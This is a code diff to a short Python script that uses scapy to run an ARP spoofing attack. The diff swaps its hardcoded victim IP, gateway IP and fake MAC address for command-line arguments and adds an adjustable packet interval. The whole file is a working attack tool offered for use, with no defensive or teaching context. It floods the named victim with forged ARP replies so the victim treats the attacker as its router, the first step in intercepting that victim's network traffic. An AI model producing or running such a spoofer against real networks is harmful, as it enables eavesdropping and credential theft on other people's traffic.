@@ -3,18 +3,22 @@
 
 from scapy.all import ARP, send
 import time
+import argparse
 
-target_ip = "192.168.1.10"     # Victim IP
-gateway_ip = "192.168.1.1"     # Gateway/router IP
-fake_mac = "de:ad:be:ef:00:01" # Fake MAC address to impersonate
+parser = argparse.ArgumentParser(description="ARP spoofer — impersonate gateway")
+parser.add_argument("--target", required=True, help="Victim IP address")
+parser.add_argument("--gateway", required=True, help="Gateway/router IP address")
+parser.add_argument("--mac", default="de:ad:be:ef:00:01", help="Fake MAC address (default: de:ad:be:ef:00:01)")
+parser.add_argument("--interval", type=float, default=2.0, help="Seconds between packets (default: 2)")
+args = parser.parse_args()
 
-packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fake_mac)
+packet = ARP(op=2, pdst=args.target, psrc=args.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=args.mac)
 
-print(f"[*] Spoofing {target_ip} into thinking we're {gateway_ip}...")
+print(f"[*] Spoofing {args.target} into thinking we're {args.gateway}...")
 try:
     while True:
         send(packet, verbose=False)
         print("[+] ARP packet sent")
-        time.sleep(2)
+        time.sleep(args.interval)
 except KeyboardInterrupt:
     print("\n[!] Stopped spoofing.")
